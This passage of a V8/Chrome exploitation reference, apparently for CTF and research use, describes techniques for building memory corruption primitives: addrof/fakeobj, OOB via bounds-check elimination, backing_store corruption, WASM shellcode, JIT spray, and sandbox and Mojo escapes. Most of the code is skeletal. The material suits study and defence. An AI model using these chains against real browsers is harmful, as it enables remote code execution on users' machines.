let rw_array = new Float64Array(0x100);
let rw_array_addr = addrof(rw_array);

// 2. Fake a Float64Array object at controlled address with modified backing_store
// 3. Corrupt backing_store pointer to target address
// 4. Read/write through the fake Float64Array → arbitrary R/W

function read64(addr) {
    // Set fake array's backing_store = addr
    write_to_fake_backingstore(addr);
    return fake_float64array[0];
}

function write64(addr, value) {
    write_to_fake_backingstore(addr);
    fake_float64array[0] = value;
}
```

---

## 4. OOB READ/WRITE VIA CONFUSED ARRAY BOUNDS

When TurboFan incorrectly eliminates bounds checks:

```javascript
function trigger(arr, idx) {
    // TurboFan thinks idx is always < arr.length
    // But due to bug, idx can exceed bounds
    return arr[idx];  // OOB read
}

// OOB read adjacent memory (next heap object's metadata)
// OOB write to corrupt next object's map/elements/length
```

### What's Adjacent in V8 Heap?

Objects are allocated sequentially in V8's young generation (new space). By controlling allocation order:

```javascript
let arr1 = new Array(0x10);    // spray object
let arr2 = new Float64Array(0x10);  // target: adjacent to arr1
// OOB from arr1 can reach arr2's metadata
// Corrupt arr2's length → unconstrained OOB on arr2
```

---

## 5. ARRAYBUFFER ARBITRARY R/W

`ArrayBuffer`'s backing store is a raw pointer to allocated memory. Corrupting it gives absolute memory R/W.

```javascript
let ab = new ArrayBuffer(0x100);
let view = new DataView(ab);
// If we can overwrite ab's backing_store pointer:
// ab.backing_store = target_addr
// view.getFloat64(0) → reads 8 bytes from target_addr
// view.setFloat64(0, val) → writes to target_addr
```

### V8 Sandbox (Pointer Compression) Impact

Since V8 ≥ 8.0 (pointer compression) and V8 sandbox (≥ 11.x):
- `ArrayBuffer.backing_store` is a **sandbox pointer** (within the V8 cage, 4GB region)
- Cannot directly point outside the V8 cage
- Need sandbox escape to get full process memory access

---

## 6. WASM RWX PAGE

WebAssembly JIT code is placed on RWX (Read-Write-Execute) pages on some platforms.

```javascript
// Allocate WASM module → JIT compiles to RWX page
let wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, ...]);
let mod = new WebAssembly.Module(wasm_code);
let instance = new WebAssembly.Instance(mod);
// instance.exports.func → points to RWX page

// If we can find and write to this page:
// 1. addrof(instance) → find WASM instance object
// 2. Follow pointers: instance → jump_table_start → RWX page
// 3. Use arbitrary write to overwrite RWX page with shellcode
// 4. Call instance.exports.func() → executes shellcode
```

**Modern Chrome**: W^X enforcement means WASM pages are either RW or RX, not RWX simultaneously. JIT code is written in RW mode, then switched to RX. Exploitation requires finding a write window or using JIT spray.

---

## 7. V8 SANDBOX

### Architecture (V8 ≥ 11.x)

```
Process Virtual Address Space:
┌──────────────────────────────────────┐
│  V8 Sandbox Cage (4GB region)        │
│  ├── V8 Heap (JS objects)            │
│  ├── ArrayBuffer backing stores      │
│  ├── WASM memory                     │
│  └── External pointer table          │
├──────────────────────────────────────┤
│  Process memory outside cage         │
│  ├── libc, Chrome code               │
│  ├── Stack                           │
│  └── Other allocations               │
└──────────────────────────────────────┘
```

### Sandbox Escape Vectors

| Vector | Method |
|---|---|
| External pointer table | Corrupt entries in the external pointer table to reference arbitrary addresses |
| WASM code pointer | Overwrite WASM function entry to jump to controlled shellcode |
| JIT code corruption | Write to JIT code page via race condition or confused pointer |
| Mojo IPC (Chrome) | Exploit Chrome IPC to attack browser process from compromised renderer |
| Backing store seal bypass | Find type confusion to get unsandboxed pointer |

---

## 8. CHROME SANDBOX ESCAPE (OVERVIEW)

After renderer RCE (via V8 exploit), the process is still sandboxed. Full compromise requires:

| Stage | Target | Example |
|---|---|---|
| Renderer exploit | V8 / Blink DOM | Type confusion → shellcode |
| IPC/Mojo bug | Chrome IPC layer | Use-after-free in Mojo interface |
| Browser process exploit | Privileged browser process | Code execution outside sandbox |

Mojo interfaces (Chrome's IPC) expose attack surface: find UAF or type confusion in Mojo message handlers.

---

## 9. TOOLS

```bash
# V8 debugging
d8 --allow-natives-syntax exploit.js  # Enable V8 intrinsics (%DebugPrint, etc.)
d8 --trace-turbo exploit.js           # Dump TurboFan IR
d8 --print-opt-code exploit.js        # Print optimized machine code

# Turbolizer: visual TurboFan IR graph
# Chrome DevTools Memory panel: heap snapshots

# Build V8 for debugging
git clone https://chromium.googlesource.com/v8/v8.git
gclient sync
gn gen out/debug --args='is_debug=true v8_enable_sandbox=false'
ninja -C out/debug d8
```

---

## 10. DECISION TREE

```
V8 vulnerability identified
├── Bug type?
│   ├── JIT type confusion → trigger optimization, confuse array element kinds
│   ├── Bounds check elimination → OOB read/write on array
│   ├── Typer bug → incorrect range leads to OOB
│   └── Builtin bug → direct memory corruption primitive
│
├── Build primitives
│   ├── Can confuse object array ↔ float array?
│   │   └── addrof + fakeobj → arbitrary R/W within V8 heap
│   ├── OOB on array?
│   │   └── Corrupt adjacent object (length/backing_store) → expand to full R/W
│   └── Direct write primitive?
│       └── Target WASM instance or ArrayBuffer metadata
│
├── V8 sandbox enabled?
│   ├── YES (modern Chrome) →
│   │   ├── R/W limited to V8 cage (4GB)
│   │   ├── Need sandbox escape: external pointer table corruption,
│   │   │   WASM code pointer overwrite, or Mojo bug
│   │   └── Then proceed to shellcode execution
│   └── NO (older V8, CTF, d8) →
│       ├── Corrupt ArrayBuffer backing_store → absolute R/W
│       └── Overwrite WASM RWX page → shellcode
│
├── Code execution method
│   ├── WASM RWX page available? → write shellcode, call WASM func
│   ├── JIT code writable? → overwrite JIT code
│   └── ROP needed? → corrupt stack or return address
│
└── Full browser exploit chain
    ├── Stage 1: V8 bug → renderer RCE
    ├── Stage 2: Mojo IPC bug → browser process compromise
    └── Stage 3: OS-level escalation (if needed)
```


---
# Part 8: V8 Exploitation Patterns


## 1. HELPER UTILITIES

Standard utility functions used in almost every V8 exploit:

```javascript
let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let u32 = new Uint32Array(buf);
let u64 = new BigUint64Array(buf);

function ftoi(f) { f64[0] = f; return u64[0]; }
function itof(i) { u64[0] = i; return f64[0]; }
function lo(i) { u64[0] = i; return u32[0]; }
function hi(i) { u64[0] = i; return u32[1]; }

function hex(i) { return '0x' + i.toString(16); }
```

### V8 Intrinsics (d8 --allow-natives-syntax)

```javascript
%DebugPrint(obj);                    // Print internal object representation
%OptimizeFunctionOnNextCall(func);   // Force TurboFan optimization
%PrepareFunctionForOptimization(func); // Mark for optimization
%SystemBreak();                      // Trigger INT3 for GDB
%CollectGarbage('major');            // Force GC
```


## 2. HEAP LAYOUT MANIPULATION

### Allocation Order in Young Generation

V8's young generation allocates objects sequentially (bump pointer). Control allocation order to ensure adjacency:

```javascript
// Allocate in order → objects are adjacent in memory
let oob_arr = [1.1, 2.2, 3.3];         // Float64 array (target for OOB)
let victim  = [{}];                      // Object array (corrupt this)
let rw_buf  = new ArrayBuffer(0x100);   // ArrayBuffer (steal backing_store)

// oob_arr elements → victim header → rw_buf header are adjacent
// OOB write from oob_arr can corrupt victim's map → type confusion
// OOB write to rw_buf can corrupt backing_store → arbitrary R/W
```

### Heap Spray for Predictable Layout

```javascript
let spray = [];
for (let i = 0; i < 1000; i++) {
    spray.push(new ArrayBuffer(0x100));
}
// Many ArrayBuffers at sequential addresses
// Known relative offsets between them
```

---

## 3. ELEMENTS KINDS CONFUSION

V8 arrays have internal "elements kind" tracked in their Map:

| Elements Kind | Storage | Interpretation |
|---|---|---|
| `PACKED_SMI_ELEMENTS` | Tagged SMI | Small integers (31-bit) |
| `PACKED_DOUBLE_ELEMENTS` | Unboxed float64 | Raw 64-bit doubles |
| `PACKED_ELEMENTS` | Tagged pointers | Object references |
| `HOLEY_*` variants | Same but with holes | Sparse arrays |

### Type Confusion: Double ↔ Object

```javascript
// If bug causes array with PACKED_ELEMENTS (object refs) to be
// treated as PACKED_DOUBLE_ELEMENTS (raw floats):
// - Reading object element as float → leaks raw pointer (addrof)
// - Writing float to object element → creates fake pointer (fakeobj)

// Transition chain (normally one-way):
// SMI → DOUBLE → ELEMENTS (never goes backward)
// Bug: forces wrong elements kind on optimized code path
```

---

## 4. MAP CONFUSION EXPLOITATION

### Corrupting Object Map

```javascript
// Object's first field is its Map pointer (compressed, 32-bit)
// Corrupting the map changes how V8 interprets the entire object

// Example: change a regular array's map to a different array type
// Before: Map says PACKED_SMI_ELEMENTS, length = 4
// After:  Map says PACKED_DOUBLE_ELEMENTS, length = 0x1000 (if map has different length offset)
// Result: Unconstrained OOB read/write through the "array"
```

### Fake Map Construction

```javascript
// To create a believable fake object, need a valid Map at the start
// Approach 1: Find existing Map address via addrof, reuse it
let target_map_addr = addrof(target_array) - 0x10n;  // approximate
// Read map from memory via OOB, copy it to controlled location

// Approach 2: Spray arrays of same type to have many identical Maps
let maps_spray = [];
for (let i = 0; i < 100; i++) {
    maps_spray.push([1.1]);  // all share same Map in V8's map space
}
```

---

## 5. GC INTERACTION AND SURVIVAL

### GC-Safe Exploitation

V8's GC moves objects (compacting GC). Exploits must account for:

| Issue | Mitigation |
|---|---|
| Object moves during GC | Pin objects in old generation (allocate enough to promote) |
| Fake object freed by GC | Ensure fake objects aren't in GC-tracked regions |
| Write barriers corrupt state | Avoid triggering write barriers on corrupted pointers |
| Weak references cleared | Don't rely on weak refs for exploit state |

### Promoting to Old Space

```javascript
// Allocate object, trigger minor GC to promote to old space (stable address)
let obj = {a: 1, b: 2};
// Fill young generation to trigger scavenge
for (let i = 0; i < 100000; i++) new Array(100);
// obj is now in old space with stable address
```

### ArrayBuffer is GC-Friendly

`ArrayBuffer`'s backing store is external memory (not managed by V8 GC). Corrupting its pointer won't be affected by GC moves.

---

## 6. COMMON EXPLOITATION CHAINS

### Chain 1: Typer Bug → OOB → addrof/fakeobj → R/W → WASM Shellcode

```javascript
// Step 1: Trigger typer bug for OOB array access
function trigger() {
    let arr = new Array(1);
    arr[0] = 1.1;
    // ... bug-specific code that makes TurboFan believe index is in bounds ...
    let oob_val = arr[oob_index];  // OOB read
    arr[oob_index] = corrupt_val;  // OOB write
}

// Step 2: Use OOB to corrupt adjacent array → addrof/fakeobj primitives
// Step 3: Build arbitrary R/W (corrupt ArrayBuffer backing_store)
// Step 4: Find WASM instance, overwrite JIT code page with shellcode
// Step 5: Call WASM function → shellcode executes
```

### Chain 2: Type Confusion → Overlapping Arrays → Length Corruption

```javascript
// Step 1: Confuse element kind (double↔object) on array
// Step 2: Through confusion, read adjacent array's length field
// Step 3: Write a huge value as the length → array now has OOB access
// Step 4: Use giant array for full heap R/W
// Step 5: Shellcode via WASM or stack ROP
```

---

## 7. V8 SANDBOX BYPASS TECHNIQUES

### External Pointer Table (EPT)

V8 sandbox stores external (out-of-cage) pointers in an External Pointer Table. Each entry:

```
EPT[index] = (raw_pointer ^ tag) | type_bits
```

Corruption approach:
1. Find EPT entry for a known external object (e.g., ArrayBuffer backing store of external memory)
2. Overwrite the entry to point to target address
3. Access through the original JS object → reads/writes outside cage

### Corrupting WASM Jump Table

```javascript
// WASM instance has jump_table_start pointing to RWX code
// Even with sandbox, WASM code pointers may be indirect
// Find WASM instance in cage → follow pointer chain to code
// Overwrite code entry in jump table with shellcode address
```

### Sandbox Hole via Type Confusion

Some V8 object types store both sandboxed and unsandboxed pointers. A type confusion that changes how a field is interpreted (sandboxed offset vs raw pointer) can escape the cage.

---

## 8. JIT SPRAY TECHNIQUE

Plant controlled immediate values in JIT-compiled code:

```javascript
// Float constants embed as 64-bit immediates in machine code
function spray() {
    let x = 1.4501798452584495e-277;  // 0x90909090_90909090 (NOP sled)
    // ... repeat with shellcode-encoding floats ...
}
// JIT compiles spray() → movabs rax, 0x9090909090909090 in code page
// Jump into the middle of the immediate → executes as NOP sled
```

**Modern mitigations**: Constant blinding (XOR constants with random key), removing RWX pages, and V8 sandbox reduce JIT spray effectiveness.

---

## 9. BROWSER-SPECIFIC CONSIDERATIONS

### Chrome Process Model

```
Browser Process (privileged)
  ├── Renderer Process 1 (sandboxed) ← V8 exploit here
  ├── Renderer Process 2 (sandboxed)
  ├── GPU Process
  ├── Network Process
  └── Utility Processes
```

### Renderer → Browser Escape via Mojo

```
Renderer compromise → find vulnerable Mojo interface →
  craft malicious IPC message → trigger bug in browser process →
  code execution in browser (unsandboxed)
```

Key Mojo targets: `BlobRegistry`, `FileSystemManager`, `NetworkService`, and other privileged interfaces.

### Memory Layout in Chrome

| Region | Contents |
|---|---|
| V8 Cage (4GB) | JS heap, WASM memory, ArrayBuffer stores |
| PartitionAlloc | Blink DOM objects, C++ objects |
| System malloc | Chrome C++ allocations outside PartitionAlloc |
| mmap regions | Shared memory, file mappings |

---

## 10. DEBUGGING AND ANALYSIS

```bash
# Build d8 for debugging
gn gen out/debug --args='is_debug=true v8_enable_sandbox=false target_cpu="x64"'
ninja -C out/debug d8

# Run with debugging features
./out/debug/d8 --allow-natives-syntax --trace-turbo --print-opt-code exploit.js

# GDB with V8
gdb ./out/debug/d8
b v8::internal::Runtime_DebugPrint  # break on %DebugPrint
r --allow-natives-syntax exploit.js

# Turbolizer (web UI for TurboFan IR)
# Open chrome://tracing, load turbo-*.json from --trace-turbo

# Useful GDB commands for V8
job <addr>          # V8 GDB helper: print V8 object at address
jst                 # Print V8 JavaScript stack trace
```
